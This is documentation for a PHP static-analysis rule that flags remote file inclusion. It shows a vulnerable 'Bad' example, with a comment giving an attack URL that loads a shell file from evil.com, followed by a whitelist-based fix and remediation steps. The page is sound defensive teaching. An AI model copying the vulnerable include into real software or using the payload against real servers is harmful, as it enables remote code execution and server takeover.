# E0070: Remote file inclusion

**In plain English:** User-controlled input is used to determine which file to include or require, allowing an attacker to load and execute remote or local files on your server.

**Why it matters:** Remote file inclusion (RFI) lets attackers:
- Include and execute PHP code from remote servers
- Read sensitive local files (LFI variant)
- Achieve full server compromise

## Bad

```php
$page = $_GET['page'] ?? '';
include $page; // ?page=http://evil.com/shell.txt
```

An attacker hosts a malicious PHP file on their server and tricks yours into including it.

## Good

```php
$page = $_GET['page'] ?? '';
$allowed = ['home', 'about', 'contact'];
if (!in_array($page, $allowed, true)) {
    $page = 'home';
}
include __DIR__ . "/pages/$page.php";
```

## What the rule checks

- `include`, `require`, `include_once`, `require_once` where the path is built from user-controlled input
- `file_get_contents()`, `readfile()`, `fopen()` with user-controlled file paths from remote sources

## When it does not report

- Whitelist validation of the page/file name before inclusion
- Static file paths with no user input

## How to fix

1. Never include files based directly on user input
2. Use a whitelist of allowed files/pages
3. Use absolute paths within your application directory
4. Set `allow_url_fopen = Off` in php.ini

## Configuration

E0070 is enabled by default and has no configuration options.
